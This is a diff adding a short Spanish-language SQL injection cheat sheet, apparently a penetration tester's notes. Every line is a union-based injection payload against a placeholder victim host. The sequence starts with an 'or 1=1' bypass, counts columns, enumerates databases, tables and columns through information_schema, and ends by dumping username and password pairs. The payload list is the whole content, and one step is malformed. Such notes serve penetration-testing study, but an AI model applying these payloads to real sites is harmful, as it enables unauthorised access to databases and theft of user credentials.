@@ -1,0 +1,37 @@
+http://ip_victima/arg' or 1=1 -- -
+
+Iteramos con el 0 si solo vemos un resultado
+http://ip_victima/arg' or 1=1 limit 0,1 -- -
+
+Iteramos sobre el 100 para encontrar el número de columnas
+http://ip_victima/arg' order by 100
+
+En caso de que solo haiga una columna
+http://ip_victima/arg' union select 1-- -
+
+Mostramos el nombre de la bbdd
+http://ip_victima/arg' database()-- -
+
+Mostramos nombre bbdd
+http://ip_victima/arg' union select  schema_name from information_schema.schemata-- -
+
+Iteramos el 0 para ver las distintas bbdd en caso de haber más.
+http://ip_victima/arg' union select  schema_name from information_schema.schemata limit 0,1-- -
+
+Enumeramos las tablas
+http://ip_victima/arg' union select table_name from information_schema.tables where table_schema="bbddname"-- -
+
+Enumeramos tablas iterando el 0
+http://ip_victima/arg' union select table_name from information_schema.tables where table_schema="bbddname" limit 0,1-- -
+
+Mostramos todas las tablas en un único campo
+http://ip_victima/arg' union select group_concat(table_name) from information_schema.tables where table_schema="bbddname"-- -
+
+Enumeramos columnas
+http://ip_victima/arg' union select column_name  from information_schema.columns where table_schema="bbddname" and table_name="tablename"-- -
+
+Enumeramos todas las columnas en un único campo
+ http://ip_victima/arg' union select group_concat(column_name)  from information_schema.columns where table_schema="bbddname" and table_name="tablename"-- -
+
+Enumeramos el contenido de las columnas usuario y contraseña
+ http://ip_victima/arg' union select group_concat(usuario,":",contraseña)  from bbddname.tablename-- -
